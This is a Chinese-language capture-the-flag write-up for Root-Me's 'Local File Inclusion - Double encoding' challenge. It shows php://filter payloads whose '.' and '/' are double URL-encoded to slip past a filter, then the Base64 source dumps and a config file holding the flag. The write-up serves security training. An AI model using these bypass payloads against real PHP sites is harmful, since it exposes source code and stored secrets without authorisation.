## [[Root-Me](https://www.root-me.org/)] [[Web-Server](https://www.root-me.org/en/Challenges/Web-Server/)] [[Local File Inclusion - Double encoding](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)] [[解题报告](http://exp-blog.com/2019/03/06/pid-3468/)]

------

PHP 的 LFI 漏洞，前置知识参考这篇文章：【[Local File Inclusion (LFI) — Web Application Penetration Testing](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601)】

这题是 【[PHP filters](https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/rootme/Web-Server/%5B20%5D%20%5B25P%5D%20PHP%20filters)】 的进阶版（未做的建议先做），除了掌握 LFI 之外，还需掌握 **双重编码** 的知识，相关知识点可查看 [这里](https://www.owasp.org/index.php/Double_Encoding) 。


------------

注意到题目有个提示：`Find the validation password in the source files of the website.`

翻译过来就是让我们从 **源码文件** 中找到密码，亦即我们的第一个目标是找到页面源码。


------------

开启挑战后，发现随着点击 `Home` 、`CV` 、`Contact` ， 页面 URL 的参数也会随之变化为 `index.php?page=home` 、 `index.php?page=cv` 、 `index.php?page=contact` 。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B25%5D%20%5B30P%5D%20Local%20File%20Inclusion%20-%20Double%20encoding/imgs/01.png)

尝试输入不存在的参数值 `index.php?page=admin` ，从页面提示的 Warning 知道代码使用了 `include` 特性，而且会自动把输入的参数拼接 `.inc.php` 后缀作为文件名，再由 `include` 包含进页面。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B25%5D%20%5B30P%5D%20Local%20File%20Inclusion%20-%20Double%20encoding/imgs/02.png)

从这种种迹象来看，其实已经满足了 LFI 的条件。

结合 【[PHP filters](https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/rootme/Web-Server/%5B20%5D%20%5B25P%5D%20PHP%20filters)】 的解题经验，要读取页面源码，可以使用 `php://filter` 特性。例如要读取 home 页面的源码，可构造这样的 payload ：

`index.php?page=php://filter/convert.base64-encode/resource=home`

但是很不幸地，这题应该是对某些字符做了过滤，马上就提示检测到攻击：`Attack detected.`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B25%5D%20%5B30P%5D%20Local%20File%20Inclusion%20-%20Double%20encoding/imgs/03.png)

尝试多次发现，在 `index.php?page=` 后面的内容如果有 `.` 或 `/` 就会触发 `Attack detected.` ，看样子应该是防止路径穿越。

于是尝试对 `.` 和 `/` 进行 URL 编码，看看能不能绕过，即重新构造 payload ：

`index.php?page=php:%2f%2ffilter%2fconvert%2ebase64-encode%2fresource=home`

但依然会触发 `Attack detected.`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B25%5D%20%5B30P%5D%20Local%20File%20Inclusion%20-%20Double%20encoding/imgs/04.png)

此时联想到题目的提示 **双重编码**，亦即对 `.` 和 `/` 字符进行两次 URL 编码处理（其实第二次编码是针对字符 `%`） ，于是有这样的编码表：

| 原字符 | 一次 URL 编码 | 二次 URL 编码 |
|:------:|:----------:|:------------:|
| `.` | `%2e` | `%252e` |
| `/` | `%2f` | `%252f` |

由此得到新的 payload 如下：

`php:%252f%252ffilter%252fconvert%252ebase64-encode%252fresource=home`

成功绕过检测，得到 Base64 编码后的页面源码。

```base64
PD9waHAgaW5jbHVkZSgiY29uZi5pbmMucGhwIik7ID8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5KLiBTbWl0aCAtIEhvbWU8L3RpdGxlPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDw/PSAkY29uZlsnZ2xvYmFsX3N0eWxlJ10gPz4KICAgIDxuYXY+CiAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWhvbWUiIGNsYXNzPSJhY3RpdmUiPkhvbWU8L2E+CiAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWN2Ij5DVjwvYT4KICAgICAgPGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9Y29udGFjdCI+Q29udGFjdDwvYT4KICAgIDwvbmF2PgogICAgPGRpdiBpZD0ibWFpbiI+CiAgICAgIDw/PSAkY29uZlsnaG9tZSddID8+CiAgICA8L2Rpdj4KICA8L2JvZHk+CjwvaHRtbD4K
```

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B25%5D%20%5B30P%5D%20Local%20File%20Inclusion%20-%20Double%20encoding/imgs/05.png)

解码后得到页面源码：

```php
<?php include("conf.inc.php"); ?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>J. Smith - Home</title>
  </head>
  <body>
    <?= $conf['global_style'] ?>
    <nav>
      <a href="index.php?page=home" class="active">Home</a>
      <a href="index.php?page=cv">CV</a>
      <a href="index.php?page=contact">Contact</a>
    </nav>
    <div id="main">
      <?= $conf['home'] ?>
    </div>
  </body>
</html>
```

虽然 home 的页面源码并无写入了密码，但从第一行的 `<?php include("conf.inc.php"); ?>` 知道存在一个 `conf.inc.php` 配置文件，猜测密码很可能就在其中。

为了读取 `conf.inc.php` 的源码，可以构造这样的 payload ：

`index.php?page=php://filter/convert.base64-encode/resource=conf.inc.php`

但从前面的测试已经知道，代码会自动添加后缀，因此去掉 `.inc.php` ：

`index.php?page=php://filter/convert.base64-encode/resource=conf`

最后对其进行双重 URL 编码，得到最终的 payload 为：

`index.php?page=php:%252f%252ffilter%252fconvert%252ebase64-encode%252fresource=conf`

输入 payload 得到 Base64  `conf.inc.php` 配置文件的编码内容：

```
PD9waHAKICAkY29uZiA9IFsKICAgICJmbGFnIiAgICAgICAgPT4gIlRoMXNJc1RoM0ZsNGchIiwKICAgICJob21lIiAgICAgICAgPT4gJzxoMj5XZWxjb21lPC9oMj4KICAgIDxkaXY+V2VsY29tZSBvbiBteSBwZXJzb25hbCB3ZWJzaXRlICE8L2Rpdj4nLAogICAgImN2IiAgICAgICAgICA9PiBbCiAgICAgICJnZW5kZXIiICAgICAgPT4gdHJ1ZSwKICAgICAgImJpcnRoIiAgICAgICA9PiA0NDE3NTk2MDAsCiAgICAgICJqb2JzIiAgICAgICAgPT4gWwogICAgICAgIFsKICAgICAgICAgICJ0aXRsZSIgICAgID0+ICJDb2ZmZWUgZGV2ZWxvcGVyIEBNZWdhdXBsb2FkIiwKICAgICAgICAgICJkYXRlIiAgICAgID0+ICIwMS8yMDEwIgogICAgICAgIF0sCiAgICAgICAgWwogICAgICAgICAgInRpdGxlIiAgICAgPT4gIkJlZCB0ZXN0ZXIgQFlvdXJNb20ncyIsCiAgICAgICAgICAiZGF0ZSIgICAgICA9PiAiMDMvMjAxMSIKICAgICAgICBdLAogICAgICAgIFsKICAgICAgICAgICJ0aXRsZSIgICAgID0+ICJCZWVyIGRyaW5rZXIgQE5lYXJlc3RCYXIiLAogICAgICAgICAgImRhdGUiICAgICAgPT4gIjEwLzIwMTQiCiAgICAgICAgXQogICAgICBdCiAgICBdLAogICAgImNvbnRhY3QiICAgICAgID0+IFsKICAgICAgImZpcnN0bmFtZSIgICAgID0+ICJKb2huIiwKICAgICAgImxhc3RuYW1lIiAgICAgID0+ICJTbWl0aCIsCiAgICAgICJwaG9uZSIgICAgICAgICA9PiAiMDEgMzMgNzEgMDAgMDEiLAogICAgICAibWFpbCIgICAgICAgICAgPT4gImpvaG4uc21pdGhAdGhlZ2FtZS5jb20iCiAgICBdLAogICAgImdsb2JhbF9zdHlsZSIgID0+ICc8c3R5bGUgbWVkaWE9InNjcmVlbiI+CiAgICAgIGJvZHl7CiAgICAgICAgYmFja2dyb3VuZDogcmdiKDIzMSwgMjMxLCAyMzEpOwogICAgICAgIGZvbnQtZmFtaWx5OiBUYWhvbWEsVmVyZGFuYSxTZWdvZSxzYW5zLXNlcmlmOwogICAgICAgIGZvbnQtc2l6ZTogMTRweDsKICAgICAgfQogICAgICBkaXYjbWFpbnsKICAgICAgICBwYWRkaW5nOiAyMHB4IDEwcHg7CiAgICAgIH0KICAgICAgbmF2ewogICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHJnYigxMDEsIDEwMSwgMTAxKTsKICAgICAgICBmb250LXNpemU6IDA7CiAgICAgIH0KICAgICAgbmF2IGF7CiAgICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICAgIHBhZGRpbmc6IDVweCAxMHB4OwogICAgICAgIGJveC1zaXppbmc6IGJvcmRlci1ib3g7CiAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgICAgICBjb2xvcjogIzU1NTsKICAgICAgfQogICAgICBuYXYgYS5hY3RpdmV7CiAgICAgICAgY29sb3I6ICNmZmY7CiAgICAgICAgYmFja2dyb3VuZDogcmdiKDExOSwgMTM4LCAxNDQpOwogICAgICB9CiAgICAgIG5hdiBhOmhvdmVyewogICAgICAgIGNvbG9yOiAjZmZmOwogICAgICAgIGJhY2tncm91bmQ6IHJnYigxMTksIDEzOCwgMTQ0KTsKICAgICAgfQogICAgICBoMnsKICAgICAgICBtYXJnaW4tdG9wOjA7CiAgICAgIH0KICAgICAgPC9zdHlsZT4nCiAgXTsK
```

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B25%5D%20%5B30P%5D%20Local%20File%20Inclusion%20-%20Double%20encoding/imgs/06.png)

解码后得到真正的源码，其中的 `flag` 就是密码，完成挑战：

```php
<?php
  $conf = [
    "flag"        => "Th1sIsTh3Fl4g!",
    "home"        => '<h2>Welcome</h2>
    <div>Welcome on my personal website !</div>',
    "cv"          => [
      "gender"      => true,
      "birth"       => 441759600,
      "jobs"        => [
        [
          "title"     => "Coffee developer @Megaupload",
          "date"      => "01/2010"
        ],
        [
          "title"     => "Bed tester @YourMom's",
          "date"      => "03/2011"
        ],
        [
          "title"     => "Beer drinker @NearestBar",
          "date"      => "10/2014"
        ]
      ]
    ],
    "contact"       => [
      "firstname"     => "John",
      "lastname"      => "Smith",
      "phone"         => "01 33 71 00 01",
      "mail"          => "john.smith@thegame.com"
    ],
    "global_style"  => '<style media="screen">
      body{
        background: rgb(231, 231, 231);
        font-family: Tahoma,Verdana,Segoe,sans-serif;
        font-size: 14px;
      }
      div#main{
        padding: 20px 10px;
      }
      nav{
        border: 1px solid rgb(101, 101, 101);
        font-size: 0;
      }
      nav a{
        font-size: 14px;
        padding: 5px 10px;
        box-sizing: border-box;
        display: inline-block;
        text-decoration: none;
        color: #555;
      }
      nav a.active{
        color: #fff;
        background: rgb(119, 138, 144);
      }
      nav a:hover{
        color: #fff;
        background: rgb(119, 138, 144);
      }
      h2{
        margin-top:0;
      }
      </style>'
  ];
```

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
